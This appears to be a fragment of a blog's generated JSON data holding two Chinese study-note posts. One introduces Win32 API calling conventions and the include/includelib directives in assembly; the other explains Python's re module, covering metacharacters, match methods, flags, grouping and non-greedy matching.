id=\"0x00-Win-API概述\"><a href=\"#0x00-Win-API概述\" class=\"headerlink\" title=\"0x00 Win API概述\"></a>0x00 Win API概述</h4><p>Win32 API实际是以一种新方法代替的DOS中用软中断的方式。</p>\n<p>API函数即将系统的功能的封装成模块（函数），在编程中，若想要使用系统的某功能，只需要调用对应的API函数，并传入相应的参数即可。</p>\n<p>一个个系统功能被封装成一个个API函数，最终放在Window的动态链接库（DLL）中。DLL是一种可执行文件，格式采用与.exe文件同样的PE文件格式。</p>\n<p>在PE文件的导出表中，会以字符串的形式指出该DLL能够提供的API函数的列表，只需要在应用程序中使用字符串形式的函数名进行API函数的调用即可。</p>","more":"<h4 id=\"0x01-Win32-API的核心由3个DLL提供：\"><a href=\"#0x01-Win32-API的核心由3个DLL提供：\" class=\"headerlink\" title=\"0x01 Win32 API的核心由3个DLL提供：\"></a>0x01 Win32 API的核心由3个DLL提供：</h4><ul>\n<li>KERNEL32.DLL ：系统服务功能。包括内存管理、任务管理等。</li>\n<li>GDI32.DLL ：图像设备接口。利用显示设备驱动程序完成显示文件和矩形等功能。</li>\n<li>USER32.DLL ：用户接口服务。建立窗口和传递消息等。</li>\n</ul>\n<blockquote>\n<p>此外，还有其他的DLL，不同的DLL实现不同的系统功能，如：Wsocket32.dll ：提供使用TCP/IP进行网络通信功能。 </p>\n</blockquote>\n<h4 id=\"0x02-函数原型\"><a href=\"#0x02-函数原型\" class=\"headerlink\" title=\"0x02 函数原型\"></a>0x02 函数原型</h4><p>在调用API函数时，函数原型必须预先声明，否则编译器无法识别。声明格式：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">函数名  proto [参数1]:类型 [,参数2]:类型</span><br></pre></td></tr></table></figure>\n<p>proto是函数声明的伪指令。</p>\n<p>参数名实际上是无意义的，因为编译器只关心参数数量，参数名在这只是提高可读性，类型基本都是dword。因此参数名可省略不写，只写 <code>:类型</code>。</p>\n<h4 id=\"0x03-API函数调用：\"><a href=\"#0x03-API函数调用：\" class=\"headerlink\" title=\"0x03 API函数调用：\"></a>0x03 API函数调用：</h4><p>Win32 API使用堆栈来传递参数，调用者将参数从右向左依次压入栈中，DLL中对应的被调用函数程序从栈中再依次弹出取出数据,并在返回前将栈中无用参数丢弃。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">;调用MessageBox</span><br><span class=\"line\"></span><br><span class=\"line\">push uType</span><br><span class=\"line\">push lpCaption</span><br><span class=\"line\">push lpText</span><br><span class=\"line\">push hWnd</span><br><span class=\"line\">call MessageBox</span><br></pre></td></tr></table></figure>\n<ul>\n<li>在编译链接之后，<code>call MessageBox</code>语句中的MessageBox会被替换为一个指向PE导入表的地址。</li>\n</ul>\n<p>传入的参数可能使用不同的数据类型，但其实对于汇编语言而言，传入的参数都是32位（dd）的整数，之所以在Win32 API中使用不同数据类型，只是为了说明用途便于理解而已。</p>\n<h4 id=\"0x04-Invoke\"><a href=\"#0x04-Invoke\" class=\"headerlink\" title=\"0x04 Invoke\"></a>0x04 Invoke</h4><p>可在每次函数调用的语句前添加，作用是检查传入的参数数量与API函数要求的参数数量是否一致，即参数是否对齐，若没有对齐，在编译程序时将报错。</p>\n<p>该指令是伪指令，由编译器识别，并不是必要的指令。</p>\n<p>使用格式：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">invoke 函数名 [,参数1] [,参数2] [...]</span><br></pre></td></tr></table></figure>\n<h4 id=\"0x05-API函数返回值\"><a href=\"#0x05-API函数返回值\" class=\"headerlink\" title=\"0x05 API函数返回值\"></a>0x05 API函数返回值</h4><ul>\n<li>函数的返回值也只有dd这一种整数类型，返回值永远放在EAX寄存器中。</li>\n</ul>\n<blockquote>\n<p>如果32位的EAX不足以存放返回数据，Win32 API采用的方法是，EAX返回一个指向真正返回值的地址指针。或者函数多定义一个参数，用于在函数调用时传递一个定义好了的缓冲区的地址，然后直接将返回值返回到缓冲区中去。</p>\n</blockquote>\n<h4 id=\"0x06-include\"><a href=\"#0x06-include\" class=\"headerlink\" title=\"0x06 include\"></a>0x06 include</h4><ul>\n<li>include作用与C语言的一样，通常用于把包含许多函数原型的文件包含进来。</li>\n</ul>\n<blockquote>\n<p>每一个DLL对应一个&lt;DLL库名.inc&gt;文件，需要使用DLL中的API函数，只需要包含对应的DLL的DDL.inc文件即可。</p>\n</blockquote>\n<ul>\n<li>编译器对于include的处理，就只是将include的文件的所有内容与该语句进行替换而已。</li>\n</ul>\n<h4 id=\"0x07-includelib\"><a href=\"#0x07-includelib\" class=\"headerlink\" title=\"0x07 includelib\"></a>0x07 includelib</h4><p>要想使用API函数，就必须先知道API函数存在哪个DLL中，所以需要有一个文件存放DLL的正确位置信息，这个文件就是导入库。</p>\n<p>导入库包含函数的位置信息和参数的个数等简单信息，一个DLL对应一个导入库。要想使用某DLL中的API函数，可以使用:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">includelib 库文件名</span><br><span class=\"line\">\t或者</span><br><span class=\"line\">includelib &lt;库文件名&gt;</span><br></pre></td></tr></table></figure>\n<p>静态链接库是一组编写好的代码模块，可以在程序中被引用，程序被编译为目标文件，然后在目标文件被链接成为可执行文件的时候，链接程序会找到静态库中的相应函数代码并把它一同链接到可执行文件中。</p>\n<p>与include不同，编译器处理includelib的方式不会把库文件的内容与该指令进行替换，它只告知连接器到指定的库文件去寻找函数的位置信息而已。</p>\n<p><img src=\"/2019/04/01/02-win32编程基础Chapter-3/图片1.png\" alt></p>"},{"title":"Python模块 Chapter 2：RE","date":"2019-04-09T07:32:30.000Z","_content":"\n### 0x00 规则\n\n```\n.      元字符.表示匹配任何字符，除\\n之外。\n*      表示匹配前面的字符或分组0次或多次。\n+      表示匹配前面的字符或分组1次或多次。\n？     表示匹配前面的字符或分组0次或1次。 \n{x}    表示匹配前面的字符或分组x次。\n{x,y}  表示匹配前面的字符或分组x次至y次之间。\n\n^      表示匹配开始为^之后的。\\A同样作用。\n$      表示匹配结束为$之前的。\\Z同样作用\n\n[abcd] 表示匹配其中的任意之一。\n[1-9]  表示匹配1-9范围内的任意之一，也可以用[A-Z]、[a-z]、[0-9a-zA-Z]。\n[^abc] 脱字符出现在[]中意义为‘非’，即不匹配其中的任何一个。也可用于范围[^1-9]、[^a-z]\n\n  \\d   表示匹配任何一个十进制数字。与[0-9]等同。\n  \\D   表示匹配任何一个非十进制数字。与[^0-9]等同。\n\n  \\w   表示匹配任何一个十进制数字和字母。与[0-9a-zA-Z]等同。\n  \\W   表示匹配任何一个除十进制数字和字母。与\\w相反\n\n  \\s   表示匹配任何一个空格字符。与[\\n\\t\\r\\v\\f]等同。\n  \\S   表示与\\s相反。与[^\\n\\t\\r\\v\\f]等同。\n\n  \\b   表示匹配任何单词边界。边界即空白或非字母数字字符\n  \\B   表示与\\b相反。\n\n  |    表示‘或’，匹配其中之一。\n\n```\n\n<!-- more -->\n\n### 0x01 转义\n\nRE使用\\来进行转义，而Python也使用\\来进行转义，因此要进行双重的转义。\n例如对`\\`进行转义：\n\n> 首先RE先进行转义:`\\\\`\n> 然后Python也要对RE的两个`\\\\`转义：`\\\\\\\\`\n\n也可以在字符串前面加`r`表示这是个Raw字符串。\n\n### 0x02 RE全局方法\n\n- **`re.match(pattern，string，flag=)`**\n\n> 匹配从***字符串开始***就符合正则模式的字符串。\n>\n> 匹配则返回***匹配对象***，否则返回none。\n\n- **`re.search(pattern，string，flag=)`**\n\n> 匹配第一个符合正则模式的字符串，即只匹配一次。\n>\n> 匹配则返回***匹配对象***，否则返回none。\n\n- **`findall(pattern，string，flag=)`**\n\n> 将字符串中所有匹配的部分作为元素放入一个***列表***并返回。\n\n- **`finditer(pattern，string，flag=)`**\n\n> 与上面一个不同的是，将每次匹配得到的匹配对象放入一个迭代器中，最后返回一个***迭代器***，而不是列表。\n>\n> 遍历迭代器时，每次返回一个***匹配对象***。\n\n- **`sub（pattern，repl，string，count=）`**\n- **`subn（pattern，repl，string，count=）`**\n\n> 匹配模式的字符串部分用`repl`字符串替代，`count`指明次数，缺省替换匹配的所有。\n> `subn`与`sub`区别在于，`subn`会返回新字符串及替换次数。\n\n- **`re.split(pattern，string，max=)`**：用模式匹配的字符串作为分隔符，分割后返回的是一个列表。max表示最多分割的次数\n- **`re.compile(pattern)`**：对模式进行编译，之后直接使用编译好的模式对象作为模式，对复杂任务效率更高。\n\n> 可以用`re.compile()`函数对正则模式字符串进行编译，并返回一个模式类对象：`<class 're.Pattern'>`\n>\n> 模式类对象自己有`match()`、`search()`、`findall()`、`finditer()`方法，方法使用与前面的全局方法一样。\n\n**上面的方法返回的匹配对象有如下方法：**\n\n- **`group()`**：返回匹配字符串。（其实默认传入0参数，意义为查看子组0）\n- **`start()`**：返回匹配字符串的开始索引值。（也可以传入子组号）\n- **`end()`**：返回匹配字符串的结束索引值。（也可以传入子组号）\n- **`span()`**：返回匹配字符串的开始与结束索引到一个元组中(start,end)。（也可以传入子组号）\n\n### 0x03 标志位（flag）\n\n\n标志位：可以用全称或简写，如re.IGNORECASE等同于re.I，多个标志位|分开，如re.A|re.I。\t\n\n```\nre.ASCII             #\\w、\\s等转义字符只匹配ASCII符，仅对Unicode有效。\nre.DOTALL/re.S       #.可以匹配全部字符，包括换行符。\nre.IGNORECASE/re.I   #匹配时不区分大小写。\nre.MULTILINE/re.M    #^$将不止匹配字符串开头和结尾，还匹配每行的行首和行尾。\nre.VERBOSE/re.X      #模式的非转义字符的空格将会被忽略，可以用#进行注释。\n```\n\n### 0x04 分组\n\n**分组的作用**：\t\n\n> 方面一： 跟数学上的一样，被括号括起来后，方便使用*、+、?、{}进行操作。\n> 方面二： 可以对匹配字符串进行再操作、再匹配。\n\n**原理**：\n\n> 首先，分组的作用只具有数学上的，将正则模式去匹配字符串，得到匹配字符串，并放入子组0中。\n> 然后，再将每个分组作为模式去匹配第一次得到匹配字符串，得到的结果依次放入子组1,2,3....\n> 有多少对括号就有多少个子组，子组号按从左到右的'('统计。\n\n**group()与groups()**\n\n> 他们都是匹配对象的方法。\n\n- group():用于获取指定子组里的匹配字符串。\n\n> 正则模式匹配的匹配字符串放入子组0，且0是该方法的默认参数。\n> 分组匹配的匹配字符串依次放入1，2，3.....子组\n> 可以传入子组号查看指定子组的内容，且可以一次传入多个子组号，顺序也不要求。\t\t\n\n- groups():用于获取所有分组的匹配字符串，结果返回一个元组。\n\n> 只包含分组的匹配字符串，不包含正则模式匹配的匹配字符串。\n\n若使用了`findall()`方法，返回的将不是匹配对象，而是列表对象。如果也使用了分组，那返回的列表的每个元素是分组匹配的，而不包含正则模式匹配的。\n\n**其他**：\n\n- 反向引用，在模式中可以用“\\[子组号]”来引用前面匹配成功的子组的匹配字符串。\n- 非捕获组：即让分组仅具有数学上意义，而不会再去匹配匹配字符串。\n\n> 通过在子组()中的最前面加：`?：` （如: `a(?:\\d)+b` #`\\d`将不会再作为模式去匹配）\n\n- 命名分组：可以给分组进行命名。\n\n> 通过在子组()中的最前面加：`?P<[name]>` （如：`a(?P<fz1>\\d)+b`）\n> 命名后，group()方法可以通过名字也可以通过子组号。\n\n**断言**：\n\n- 前向肯定断言：如果此分组在此处匹配成功则成功，否则失败。`(?=...)` #`...`处是分组正则模式。\n- 前向否定断言：如果此分组在此处匹配成功则失败，否则成功。`(?!...)` #`...`处是分组正则模式。\n\n### 0x05 非贪婪匹配\n\n`？`为非贪婪操作符，`*`、`+`、`？`、`{}`都是贪婪操作符（`?`有两重作用）。\n\n通过在贪婪符之后加`？`，表示让它们尽可能少的匹配。\n\n> 即先让后面的匹配，自己再匹配，或者说自己尽可能少的匹配，别人尽可能多的匹配。\n\n**非贪婪匹配例子**\n\n\t如：\t\n\t    pattern1 = ‘.*(\\d+)’   #贪婪匹配\n\t    pattern2 = ‘.*?(\\d+)’  #非贪婪匹配\n\t    string=‘aa114321’\n贪婪模式下：`.*`将匹配到`aa114321`,子组1匹配到`1`。(re.search(pattern1,string))\n\n非贪婪模式下（`*`后面加`？`）：`.*?`匹配到`aa`，因为尽可能少匹配，反过来就是要让后面的尽可能多的匹配，因此子组匹配到`114321`。(re.findall(pattern2,string))\t\n\n![](02python模块之re\\QQ截图20190409170216.png)\n\n​\t\t","source":"_posts/02python模块之re.md","raw":"---\ntitle: Python模块 Chapter 2：RE\ndate: 2019-04-09 15:32:30\ntags:\n\t- Python模块\n\t- Language\ncategories: Python\n---\n\n### 0x00 规则\n\n```\n.      元字符.表示匹配任何字符，除\\n之外。\n*      表示匹配前面的字符或分组0次或多次。\n+      表示匹配前面的字符或分组1次或多次。\n？     表示匹配前面的字符或分组0次或1次。 \n{x}    表示匹配前面的字符或分组x次。\n{x,y}  表示匹配前面的字符或分组x次至y次之间。\n\n^      表示匹配开始为^之后的。\\A同样作用。\n$      表示匹配结束为$之前的。\\Z同样作用\n\n[abcd] 表示匹配其中的任意之一。\n[1-9]  表示匹配1-9范围内的任意之一，也可以用[A-Z]、[a-z]、[0-9a-zA-Z]。\n[^abc] 脱字符出现在[]中意义为‘非’，即不匹配其中的任何一个。也可用于范围[^1-9]、[^a-z]\n\n  \\d   表示匹配任何一个十进制数字。与[0-9]等同。\n  \\D   表示匹配任何一个非十进制数字。与[^0-9]等同。\n\n  \\w   表示匹配任何一个十进制数字和字母。与[0-9a-zA-Z]等同。\n  \\W   表示匹配任何一个除十进制数字和字母。与\\w相反\n\n  \\s   表示匹配任何一个空格字符。与[\\n\\t\\r\\v\\f]等同。\n  \\S   表示与\\s相反。与[^\\n\\t\\r\\v\\f]等同。\n\n  \\b   表示匹配任何单词边界。边界即空白或非字母数字字符\n  \\B   表示与\\b相反。\n\n  |    表示‘或’，匹配其中之一。\n\n```\n\n<!-- more -->\n\n### 0x01 转义\n\nRE使用\\来进行转义，而Python也使用\\来进行转义，因此要进行双重的转义。\n例如对`\\`进行转义：\n\n> 首先RE先进行转义:`\\\\`\n> 然后Python也要对RE的两个`\\\\`转义：`\\\\\\\\`\n\n也可以在字符串前面加`r`表示这是个Raw字符串。\n\n### 0x02 RE全局方法\n\n- **`re.match(pattern，string，flag=)`**\n\n> 匹配从***字符串开始***就符合正则模式的字符串。\n>\n> 匹配则返回***匹配对象***，否则返回none。\n\n- **`re.search(pattern，string，flag=)`**\n\n> 匹配第一个符合正则模式的字符串，即只匹配一次。\n>\n> 匹配则返回***匹配对象***，否则返回none。\n\n- **`findall(pattern，string，flag=)`**\n\n> 将字符串中所有匹配的部分作为元素放入一个***列表***并返回。\n\n- **`finditer(pattern，string，flag=)`**\n\n> 与上面一个不同的是，将每次匹配得到的匹配对象放入一个迭代器中，最后返回一个***迭代器***，而不是列表。\n>\n> 遍历迭代器时，每次返回一个***匹配对象***。\n\n- **`sub（pattern，repl，string，count=）`**\n- **`subn（pattern，repl，string，count=）`**\n\n> 匹配模式的字符串部分用`repl`字符串替代，`count`指明次数，缺省替换匹配的所有。\n> `subn`与`sub`区别在于，`subn`会返回新字符串及替换次数。\n\n- **`re.split(pattern，string，max=)`**：用模式匹配的字符串作为分隔符，分割后返回的是一个列表。max表示最多分割的次数\n- **`re.compile(pattern)`**：对模式进行编译，之后直接使用编译好的模式对象作为模式，对复杂任务效率更高。\n\n> 可以用`re.compile()`函数对正则模式字符串进行编译，并返回一个模式类对象：`<class 're.Pattern'>`\n>\n> 模式类对象自己有`match()`、`search()`、`findall()`、`finditer()`方法，方法使用与前面的全局方法一样。\n\n**上面的方法返回的匹配对象有如下方法：**\n\n- **`group()`**：返回匹配字符串。（其实默认传入0参数，意义为查看子组0）\n- **`start()`**：返回匹配字符串的开始索引值。（也可以传入子组号）\n- **`end()`**：返回匹配字符串的结束索引值。（也可以传入子组号）\n- **`span()`**：返回匹配字符串的开始与结束索引到一个元组中(start,end)。（也可以传入子组号）\n\n### 0x03 标志位（flag）\n\n\n标志位：可以用全称或简写，如re.IGNORECASE等同于re.I，多个标志位|分开，如re.A|re.I。\t\n\n```\nre.ASCII             #\\w、\\s等转义字符只匹配ASCII符，仅对Unicode有效。\nre.DOTALL/re.S       #.可以匹配全部字符，包括换行符。\nre.IGNORECASE/re.I   #匹配时不区分大小写。\nre.MULTILINE/re.M    #^$将不止匹配字符串开头和结尾，还匹配每行的行首和行尾。\nre.VERBOSE/re.X      #模式的非转义字符的空格将会被忽略，可以用#进行注释。\n```\n\n### 0x04 分组\n\n**分组的作用**：\t\n\n> 方面一： 跟数学上的一样，被括号括起来后，方便使用*、+、?、{}进行操作。\n> 方面二： 可以对匹配字符串进行再操作、再匹配。\n\n**原理**：\n\n> 首先，分组的作用只具有数学上的，将正则模式去匹配字符串，得到匹配字符串，并放入子组0中。\n> 然后，再将每个分组作为模式去匹配第一次得到匹配字符串，得到的结果依次放入子组1,2,3....\n> 有多少对括号就有多少个子组，子组号按从左到右的'('统计。\n\n**group()与groups()**\n\n> 他们都是匹配对象的方法。\n\n- group():用于获取指定子组里的匹配字符串。\n\n> 正则模式匹配的匹配字符串放入子组0，且0是该方法的默认参数。\n> 分组匹配的匹配字符串依次放入1，2，3.....子组\n> 可以传入子组号查看指定子组的内容，且可以一次传入多个子组号，顺序也不要求。\t\t\n\n- groups():用于获取所有分组的匹配字符串，结果返回一个元组。\n\n> 只包含分组的匹配字符串，不包含正则模式匹配的匹配字符串。\n\n若使用了`findall()`方法，返回的将不是匹配对象，而是列表对象。如果也使用了分组，那返回的列表的每个元素是分组匹配的，而不包含正则模式匹配的。\n\n**其他**：\n\n- 反向引用，在模式中可以用“\\[子组号]”来引用前面匹配成功的子组的匹配字符串。\n- 非捕获组：即让分组仅具有数学上意义，而不会再去匹配匹配字符串。\n\n> 通过在子组()中的最前面加：`?：` （如: `a(?:\\d)+b` #`\\d`将不会再作为模式去匹配）\n\n- 命名分组：可以给分组进行命名。\n\n> 通过在子组()中的最前面加：`?P<[name]>` （如：`a(?P<fz1>\\d)+b`）\n> 命名后，group()方法可以通过名字也可以通过子组号。\n\n**断言**：\n\n- 前向肯定断言：如果此分组在此处匹配成功则成功，否则失败。`(?=...)` #`...`处是分组正则模式。\n- 前向否定断言：如果此分组在此处匹配成功则失败，否则成功。`(?!...)` #`...`处是分组正则模式。\n\n### 0x05 非贪婪匹配\n\n`？`为非贪婪操作符，`*`、`+`、`？`、`{}`都是贪婪操作符（`?`有两重作用）。\n\n通过在贪婪符之后加`？`，表示让它们尽可能少的匹配。\n\n> 即先让后面的匹配，自己再匹配，或者说自己尽可能少的匹配，别人尽可能多的匹配。\n\n**非贪婪匹配例子**\n\n\t如：\t\n\t    pattern1 = ‘.*(\\d+)’   #贪婪匹配\n\t    pattern2 = ‘.*?(\\d+)’  #非贪婪匹配\n\t    string=‘aa114321’\n贪婪模式下：`.*`将匹配到`aa114321`,子组1匹配到`1`。(re.search(pattern1,string))\n\n非贪婪模式下（`*`后面加`？`）：`.*?`匹配到`aa`，因为尽可能少匹配，反过来就是要让后面的尽可能多的匹配，因此子组匹配到`114321`。(re.findall(pattern2,string))\t\n\n![](02python模块之re\\QQ截图20190409170216.png)\n\n​\t\t","slug":"02python模块之re","published":1,"updated":"2019-04-09T09:11:25.775Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjuam83jb000c7or08gg5rpau","content":"<h3 id=\"0x00-规则\"><a href=\"#0x00-规则\" class=\"headerlink\" title=\"0x00 规则\"></a>0x00 规则</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.      元字符.表示匹配任何字符，除\\n之外。</span><br><span class=\"line\">*      表示匹配前面的字符或分组0次或多次。</span><br><span class=\"line\">+      表示匹配前面的字符或分组1次或多次。</span><br><span class=\"line\">？     表示匹配前面的字符或分组0次或1次。 </span><br><span class=\"line\">&#123;x&#125;    表示匹配前面的字符或分组x次。</span><br><span class=\"line\">&#123;x,y&#125;  表示匹配前面的字符或分组x次至y次之间。</span><br><span class=\"line\"></span><br><span class=\"line\">^      表示匹配开始为^之后的。\\A同样作用。</span><br><span class=\"line\">$      表示匹配结束为$之前的。\\Z同样作用</span><br><span class=\"line\"></span><br><span class=\"line\">[abcd] 表示匹配其中的任意之一。</span><br><span class=\"line\">[1-9]  表示匹配1-9范围内的任意之一，也可以用[A-Z]、[a-z]、[0-9a-zA-Z]。</span><br><span class=\"line\">[^abc] 脱字符出现在[]中意义为‘非’，即不匹配其中的任何一个。也可用于范围[^1-9]、[^a-z]</span><br><span class=\"line\"></span><br><span class=\"line\">  \\d   表示匹配任何一个十进制数字。与[0-9]等同。</span><br><span class=\"line\">  \\D   表示匹配任何一个非十进制数字。与[^0-9]等同。</span><br><span class=\"line\"></span><br><span class=\"line\">  \\w   表示匹配任何一个十进制数字和字母。与[0-9a-zA-Z]等同。</span><br><span class=\"line\">  \\W   表示匹配任何一个除十进制数字和字母。与\\w相反</span><br><span class=\"line\"></span><br><span class=\"line\">  \\s   表示匹配任何一个空格字符。与[\\n\\t\\r\\v\\f]等同。</span><br><span class=\"line\">  \\S   表示与\\s相反。与[^\\n\\t\\r\\v\\f]等同。</span><br><span class=\"line\"></span><br><span class=\"line\">  \\b   表示匹配任何单词边界。边界即空白或非字母数字字符</span><br><span class=\"line\">  \\B   表示与\\b相反。</span><br><span class=\"line\"></span><br><span class=\"line\">  |    表示‘或’，匹配其中之一。</span><br></pre></td></tr></table></figure>\n<a id=\"more\"></a>\n<h3 id=\"0x01-转义\"><a href=\"#0x01-转义\" class=\"headerlink\" title=\"0x01 转义\"></a>0x01 转义</h3><p>RE使用\\来进行转义，而Python也使用\\来进行转义，因此要进行双重的转义。<br>例如对<code>\\</code>进行转义：</p>\n<blockquote>\n<p>首先RE先进行转义:<code>\\\\</code><br>然后Python也要对RE的两个<code>\\\\</code>转义：<code>\\\\\\\\</code></p>\n</blockquote>\n<p>也可以在字符串前面加<code>r</code>表示这是个Raw字符串。</p>\n<h3 id=\"0x02-RE全局方法\"><a href=\"#0x02-RE全局方法\" class=\"headerlink\" title=\"0x02 RE全局方法\"></a>0x02 RE全局方法</h3><ul>\n<li><strong><code>re.match(pattern，string，flag=)</code></strong></li>\n</ul>\n<blockquote>\n<p>匹配从<strong><em>字符串开始</em></strong>就符合正则模式的字符串。</p>\n<p>匹配则返回<strong><em>匹配对象</em></strong>，否则返回none。</p>\n</blockquote>\n<ul>\n<li><strong><code>re.search(pattern，string，flag=)</code></strong></li>\n</ul>\n<blockquote>\n<p>匹配第一个符合正则模式的字符串，即只匹配一次。</p>\n<p>匹配则返回<strong><em>匹配对象</em></strong>，否则返回none。</p>\n</blockquote>\n<ul>\n<li><strong><code>findall(pattern，string，flag=)</code></strong></li>\n</ul>\n<blockquote>\n<p>将字符串中所有匹配的部分作为元素放入一个<strong><em>列表</em></strong>并返回。</p>\n</blockquote>\n<ul>\n<li><strong><code>finditer(pattern，string，flag=)</code></strong></li>\n</ul>\n<blockquote>\n<p>与上面一个不同的是，将每次匹配得到的匹配对象放入一个迭代器中，最后返回一个<strong><em>迭代器</em></strong>，而不是列表。</p>\n<p>遍历迭代器时，每次返回一个<strong><em>匹配对象</em></strong>。</p>\n</blockquote>\n<ul>\n<li><strong><code>sub（pattern，repl，string，count=）</code></strong></li>\n<li><strong><code>subn（pattern，repl，string，count=）</code></strong></li>\n</ul>\n<blockquote>\n<p>匹配模式的字符串部分用<code>repl</code>字符串替代，<code>count</code>指明次数，缺省替换匹配的所有。<br><code>subn</code>与<code>sub</code>区别在于，<code>subn</code>会返回新字符串及替换次数。</p>\n</blockquote>\n<ul>\n<li><strong><code>re.split(pattern，string，max=)</code></strong>：用模式匹配的字符串作为分隔符，分割后返回的是一个列表。max表示最多分割的次数</li>\n<li><strong><code>re.compile(pattern)</code></strong>：对模式进行编译，之后直接使用编译好的模式对象作为模式，对复杂任务效率更高。</li>\n</ul>\n<blockquote>\n<p>可以用<code>re.compile()</code>函数对正则模式字符串进行编译，并返回一个模式类对象：<code>&lt;class &#39;re.Pattern&#39;&gt;</code></p>\n<p>模式类对象自己有<code>match()</code>、<code>search()</code>、<code>findall()</code>、<code>finditer()</code>方法，方法使用与前面的全局方法一样。</p>\n</blockquote>\n<p><strong>上面的方法返回的匹配对象有如下方法：</strong></p>\n<ul>\n<li><strong><code>group()</code></strong>：返回匹配字符串。（其实默认传入0参数，意义为查看子组0）</li>\n<li><strong><code>start()</code></strong>：返回匹配字符串的开始索引值。（也可以传入子组号）</li>\n<li><strong><code>end()</code></strong>：返回匹配字符串的结束索引值。（也可以传入子组号）</li>\n<li><strong><code>span()</code></strong>：返回匹配字符串的开始与结束索引到一个元组中(start,end)。（也可以传入子组号）</li>\n</ul>\n<h3 id=\"0x03-标志位（flag）\"><a href=\"#0x03-标志位（flag）\" class=\"headerlink\" title=\"0x03 标志位（flag）\"></a>0x03 标志位（flag）</h3><p>标志位：可以用全称或简写，如re.IGNORECASE等同于re.I，多个标志位|分开，如re.A|re.I。    </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">re.ASCII             #\\w、\\s等转义字符只匹配ASCII符，仅对Unicode有效。</span><br><span class=\"line\">re.DOTALL/re.S       #.可以匹配全部字符，包括换行符。</span><br><span class=\"line\">re.IGNORECASE/re.I   #匹配时不区分大小写。</span><br><span class=\"line\">re.MULTILINE/re.M    #^$将不止匹配字符串开头和结尾，还匹配每行的行首和行尾。</span><br><span class=\"line\">re.VERBOSE/re.X      #模式的非转义字符的空格将会被忽略，可以用#进行注释。</span><br></pre></td></tr></table></figure>\n<h3 id=\"0x04-分组\"><a href=\"#0x04-分组\" class=\"headerlink\" title=\"0x04 分组\"></a>0x04 分组</h3><p><strong>分组的作用</strong>：    </p>\n<blockquote>\n<p>方面一： 跟数学上的一样，被括号括起来后，方便使用*、+、?、{}进行操作。<br>方面二： 可以对匹配字符串进行再操作、再匹配。</p>\n</blockquote>\n<p><strong>原理</strong>：</p>\n<blockquote>\n<p>首先，分组的作用只具有数学上的，将正则模式去匹配字符串，得到匹配字符串，并放入子组0中。<br>然后，再将每个分组作为模式去匹配第一次得到匹配字符串，得到的结果依次放入子组1,2,3….<br>有多少对括号就有多少个子组，子组号按从左到右的’(‘统计。</p>\n</blockquote>\n<p><strong>group()与groups()</strong></p>\n<blockquote>\n<p>他们都是匹配对象的方法。</p>\n</blockquote>\n<ul>\n<li>group():用于获取指定子组里的匹配字符串。</li>\n</ul>\n<blockquote>\n<p>正则模式匹配的匹配字符串放入子组0，且0是该方法的默认参数。<br>分组匹配的匹配字符串依次放入1，2，3…..子组<br>可以传入子组号查看指定子组的内容，且可以一次传入多个子组号，顺序也不要求。        </p>\n</blockquote>\n<ul>\n<li>groups():用于获取所有分组的匹配字符串，结果返回一个元组。</li>\n</ul>\n<blockquote>\n<p>只包含分组的匹配字符串，不包含正则模式匹配的匹配字符串。</p>\n</blockquote>\n<p>若使用了<code>findall()</code>方法，返回的将不是匹配对象，而是列表对象。如果也使用了分组，那返回的列表的每个元素是分组匹配的，而不包含正则模式匹配的。</p>\n<p><strong>其他</strong>：</p>\n<ul>\n<li>反向引用，在模式中可以用“[子组号]”来引用前面匹配成功的子组的匹配字符串。</li>\n<li>非捕获组：即让分组仅具有数学上意义，而不会再去匹配匹配字符串。</li>\n</ul>\n<blockquote>\n<p>通过在子组()中的最前面加：<code>?：</code> （如: <code>a(?:\\d)+b</code> #<code>\\d</code>将不会再作为模式去匹配）</p>\n</blockquote>\n<ul>\n<li>命名分组：可以给分组进行命名。</li>\n</ul>\n<blockquote>\n<p>通过在子组()中的最前面加：<code>?P&lt;[name]&gt;</code> （如：<code>a(?P&lt;fz1&gt;\\d)+b</code>）<br>命名后，group()方法可以通过名字也可以通过子组号。</p>\n</blockquote>\n<p><strong>断言</strong>：</p>\n<ul>\n<li>前向肯定断言：如果此分组在此处匹配成功则成功，否则失败。<code>(?=...)</code> #<code>...</code>处是分组正则模式。</li>\n<li>前向否定断言：如果此分组在此处匹配成功则失败，否则成功。<code>(?!...)</code> #<code>...</code>处是分组正则模式。</li>\n</ul>\n<h3 id=\"0x05-非贪婪匹配\"><a href=\"#0x05-非贪婪匹配\" class=\"headerlink\" title=\"0x05 非贪婪匹配\"></a>0x05 